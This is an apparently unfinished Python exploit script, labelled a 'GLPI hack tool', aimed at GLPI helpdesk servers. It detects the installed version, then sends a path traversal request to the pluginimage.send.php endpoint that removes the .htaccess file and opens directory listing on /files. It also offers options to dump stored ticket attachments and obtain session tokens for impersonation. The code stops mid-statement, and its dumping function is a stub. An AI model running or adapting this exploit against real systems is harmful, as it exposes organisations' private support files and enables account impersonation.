#!/usr/bin/env python3
import requests
import re
import argparse
parser = argparse.ArgumentParser(description='GLPI hack tool')
parser.add_argument('--url', help="URL of the GLPI instance", required=True)
parser.add_argument('--dumpfiles',help="Dump the stored ticket attachments", action="store_true")
parser.add_argument('--check',help="Only check if the taget is vulnerable", action="store_true")
parser.add_argument('--token', help="Get valid session tokens for impersonation.", action="store_true")
parser.add_argument('--exploit', help="Attempts to exploit the plulginimage vulnerability to get directory listing on /files.", action="store_true")

args = parser.parse_args()

versions = ['0.20', '0.20.1', '0.21', '0.30', '0.31', '0.40', '0.41', '0.42', '0.50', '0.51', '0.51a', '0.60', '0.65',
            '0.68', '0.68.1', '0.68.2', '0.68.3', '0.70', '0.70.1', '0.70.2', '0.71', '0.71.1', '0.71.2', '0.71.3',
            '0.71.4', '0.71.5', '0.71.6', '0.72', '0.72.1', '0.72.2', '0.72.3', '0.72.4', '0.72.21', '0.78', '0.78.1',
            '0.78.2', '0.78.3', '0.78.4', '0.78.5', '0.80', '0.80.1', '0.80.2', '0.80.3', '0.80.4', '0.80.5', '0.80.6',
            '0.80.7', '0.80.61', '0.83', '0.83.1', '0.83.2', '0.83.3', '0.83.4', '0.83.5', '0.83.6', '0.83.7', '0.83.8',
            '0.83.9', '0.83.31', '0.83.91', '0.84', '0.84.1', '0.84.2', '0.84.3', '0.84.4', '0.84.5', '0.84.6',
            '0.84.7', '0.84.8', '0.85', '0.85.1', '0.85.2', '0.85.3', '0.85.4', '0.85.5', '0.90', '0.90.1', '0.90.2',
            '0.90.3', '0.90.4', '0.90.5', '9.1', '9.1.1', '9.1.2', '9.1.3', '9.1.4', '9.1.5', '9.1.6', '9.1.7',
            '9.1.7.1', '9.2', '9.2.1', '9.2.2', '9.2.3', '9.2.4', '9.3', '9.3.0', '9.3.1', '9.3.2', '9.3.3', '9.3.4',
            '9.4.0', '9.4.1', '9.4.1.1', '9.4.2', '9.4.3', '9.4.4', '9.4.5', '9.4.6', '9.5.0', '9.5.1']


def checkVulnerable():
    res = requests.get(args.url)
    detectedVersion = ""
    vulnerable = False
    for version in versions:
        search = bool(re.search(version, res.text))
        if search == True:
            detectedVersion = version
            vulnerable = True
    if vulnerable:
        print("Detected GLPI version " + detectedVersion + ", which is most likely vulnerable.")
    else:
        print("The target does not appear to be vulnerable.")
    return vulnerable

def checkFiles():
    res = requests.get(args.url + "/files")
    search = bool(re.search("Index of", res.text))
    return search

def dumpFiles():
    if not checkFiles():
        print("Directory listing is not enabled on /files. use --exploit to exploit the pulginimage vulnerability.")

def exploit():
    if checkVulnerable() and not checkFiles():
        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=.htaccess&clean")
    if checkFiles(): 
        print("Exploitation successful, directory listing is now enabled on the /files folder.")
        return True
    else: 
        print("Exploitation unsuccessful, unable to get directory listing on the /files folder.")
        return False

if args.check:
    if checkFiles():
        print("The target already has directory listing on the /files folder. Use --dumpfiles or --session for exploitation.")
        quit()
    checkVulnerable()
    quit()

if args.exploit:
    exploit()

if args.dumpfiles:
    

